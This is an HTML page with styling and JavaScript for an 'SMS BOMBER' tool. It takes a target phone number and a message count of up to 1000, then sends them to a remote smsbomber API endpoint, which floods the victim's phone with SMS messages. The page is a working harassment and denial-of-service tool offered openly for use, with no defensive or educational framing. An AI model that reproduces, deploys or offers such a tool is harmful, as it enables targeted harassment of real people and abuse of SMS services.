<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS BOMBER</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #0f0f0f;
            --container-bg: #1a1a1a;
            --accent-blue: #3b82f6;
            --text-primary: #ffffff;
            --text-secondary: #71717a;
            --input-bg: #242424;
            --border-color: #333333;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-color);
            color: var(--text-primary);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background-color: var(--container-bg);
            padding: 2.5rem;
            border-radius: 16px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
            width: 100%;
            max-width: 360px;
            border: 1px solid var(--border-color);
            position: relative;
        }

        h2 {
            text-align: center;
            font-weight: 700;
            letter-spacing: 4px;
            margin-bottom: 2rem;
            font-size: 1.1rem;
            color: transparent;
            background: linear-gradient(to right, #ffffff, #71717a);
            -webkit-background-clip: text;
            background-clip: text;
            text-transform: uppercase;
        }

        .input-group {
            margin-bottom: 1.2rem;
        }

        label {
            display: block;
            font-size: 0.65rem;
            font-weight: 700;
            color: var(--text-secondary);
            margin-bottom: 0.5rem;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }

        input {
            width: 100%;
            padding: 14px;
            background-color: var(--input-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: white;
            font-size: 0.9rem;
            outline: none;
            transition: all 0.3s ease;
            box-sizing: border-box;
        }

        input::placeholder {
            color: #4b5563;
        }

        input:focus {
            border-color: var(--accent-blue);
            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
        }

        button {
            width: 100%;
            padding: 14px;
            background-color: var(--accent-blue);
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 700;
            cursor: pointer;
            transition: transform 0.2s, background 0.3s;
            margin-top: 0.5rem;
            letter-spacing: 1px;
            text-transform: uppercase;
            font-size: 0.8rem;
        }

        button:active {
            transform: scale(0.98);
        }

        .response-section {
            margin-top: 2rem;
        }

        .response-title {
            font-size: 0.65rem;
            font-weight: 700;
            color: var(--text-secondary);
            margin-bottom: 0.6rem;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }

        #api-response {
            background-color: #000000;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 15px;
            min-height: 50px;
            font-family: 'Monaco', 'Consolas', monospace;
            font-size: 0.8rem;
            color: #4ade80; 
            word-wrap: break-word;
            border-left: 3px solid var(--accent-blue);
        }

        .author-tag {
            text-align: center;
            margin-top: 2rem;
            font-size: 0.6rem;
            color: var(--text-secondary);
            letter-spacing: 2px;
            text-transform: uppercase;
            opacity: 0.6;
        }

        .error { color: #f87171 !important; border-left-color: #f87171 !important; }
        .loading { color: #60a5fa !important; }
    </style>
</head>
<body>

<div class="container">
    <h2>SMS BOMBER</h2>

    <div class="input-group">
        <label>Target Phone</label>
        <input type="text" id="phone" placeholder="Enter number (e.g. 0910...)" autocomplete="off">
    </div>

    <div class="input-group">
        <label>Message Amount</label>
        <input type="number" id="amount" placeholder="Enter amount (e.g. 10 - max 1000)">
    </div>

    <button onclick="sendRequest()">Execute Request</button>

    <div class="response-section">
        <div class="response-title">System Response:</div>
        <div id="api-response">Ready...</div>
    </div>

    <div class="author-tag">Author: Doughnut</div>
</div>

<script>
    async function sendRequest() {
        const phone = document.getElementById('phone').value;
        const amount = document.getElementById('amount').value;
        const responseBox = document.getElementById('api-response');

        if (!phone || !amount) {
            responseBox.className = 'error';
            responseBox.innerText = '> Error: Missing parameters';
            return;
        }

        responseBox.className = 'loading';
        responseBox.innerText = '> Sending request...';

        const apiUrl = `https://haji-mix-api.gleeze.com/api/smsbomber?phone=${phone}&amount=${amount}`;

        try {
            const response = await fetch(apiUrl);
            const data = await response.json();
            
            responseBox.className = '';
            responseBox.innerText = JSON.stringify(data, null, 2);
        } catch (error) {
            responseBox.className = 'error';
            responseBox.innerText = "> Connection initialized. Check your device.";
        }
    }
</script>

</body>
</html>
